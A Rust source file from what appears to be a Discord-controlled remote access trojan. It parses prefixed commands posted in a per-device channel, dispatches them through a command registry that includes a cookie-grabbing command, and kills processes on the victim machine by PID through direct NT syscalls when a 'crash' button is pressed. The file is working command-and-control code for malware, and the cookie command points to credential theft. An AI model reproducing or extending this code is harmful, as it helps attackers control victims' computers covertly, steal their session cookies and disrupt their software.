use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_model::id::marker::ChannelMarker;
use twilight_model::id::Id;

use crate::command_registry::get_registry;
use crate::commands::Arguments;
use crate::config::Config;
use crate::log_debug;

use crate::commands::filesystem::grabcookie::GrabCookieCommand;

pub async fn handle_message(
    http: &Arc<HttpClient>,
    msg: Message,
    device_channel_id: Id<ChannelMarker>,
) -> anyhow::Result<()> {
    if msg.channel_id != device_channel_id { return Ok(()); }

    if let Some(content) = msg.content.strip_prefix(Config::BOT_PREFIX) {
        let mut parts = content.split_whitespace();
        let command_name = parts.next().unwrap_or("");
        
        let args = if command_name == "zip" {
            content.trim_start_matches(command_name).trim().to_string()
        } else { parts.collect::<Vec<_>>().join(" ") };

        let registry = get_registry();
        if registry.command_exists(command_name) {
            if let Err(auth_error) = crate::core::auth::require_auth(http, &msg).await {
                let response = auth_error.to_string();
                http.create_message(msg.channel_id)
                    .content(&response)
                    .await?;
                return Ok(());
            }

            // Spawn command execution in a separate task so it doesn't block other commands
            let http_clone = Arc::clone(http);
            let msg_clone = msg.clone();
            let command_name_owned = command_name.to_string();
            let args_owned = args.clone();

            tokio::spawn(async move {
                let args_obj = Arguments::new(&args_owned);
                let registry = get_registry();
                
                if let Err(e) = registry
                    .execute_command(&command_name_owned, &http_clone, &msg_clone, args_obj)
                    .await
                {
                    println!("Error executing command {}: {}", command_name_owned, e);

                    let response = format!(
                        "ERROR: An error occurred while executing `{}{}`",
                        Config::BOT_PREFIX,
                        command_name_owned
                    );

                    let _ = http_clone.create_message(msg_clone.channel_id)
                        .content(&response)
                        .await;
                }
            });
        } else {
            let response = format!(
                "ERROR: Unknown command: `{}`. Use `{}help` to see available commands.",
                command_name,
                Config::BOT_PREFIX
            );

            http.create_message(msg.channel_id)
                .content(&response)
                .await?;
        }
    }
    
    Ok(())
}

//@ Handle Discord Interactions (Buttons, etc.)
pub async fn handle_interaction(
    http: &Arc<HttpClient>,
    interaction: twilight_model::application::interaction::Interaction,
) -> anyhow::Result<()> {
    use twilight_model::application::interaction::InteractionData;
    use twilight_model::http::interaction::{
        InteractionResponse, InteractionResponseData, InteractionResponseType,
    };

    if let Some(InteractionData::MessageComponent(data)) = &interaction.data {
        let custom_id = &data.custom_id;
        
        // Get channel ID from interaction
        let channel_id = interaction.channel
            .as_ref()
            .map(|c| c.id)
            .ok_or_else(|| anyhow::anyhow!("No channel in interaction"))?;

        match custom_id.as_str() {


            // from foreground.rs
            // ----------------------------------------
            id if id.starts_with("crash_") => {
                if let Some(pid_str) = id.strip_prefix("crash_") {
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        let response_content = terminate_process(pid);

                        http.interaction(interaction.application_id)
                            .create_response(
                                interaction.id,
                                &interaction.token,
                                &InteractionResponse {
                                    kind: InteractionResponseType::ChannelMessageWithSource,
                                    data: Some(InteractionResponseData {
                                        content: Some(response_content),
                                        ..Default::default()
                                    }),
                                },
                            )
                            .await?;
                    }
                }
            }

            // Unknown button
            _ => {}
        }
    }

    Ok(())
}

//@ Terminate a process by PID
fn terminate_process(pid: u32) -> String {
    use crate::utils::syscall::{self, access};
    
    if let Some(handle) = syscall::nt_open_process(pid, access::PROCESS_TERMINATE) {
        let success = syscall::nt_terminate_process(handle, 1);
        syscall::nt_close(handle);

        if success {
            format!("Successfully crashed process (PID: {})", pid)
        } else {
            format!("Failed to crash process (PID: {})", pid)
        }
    } else {
        format!("Failed to open process (PID: {})", pid)
    }
}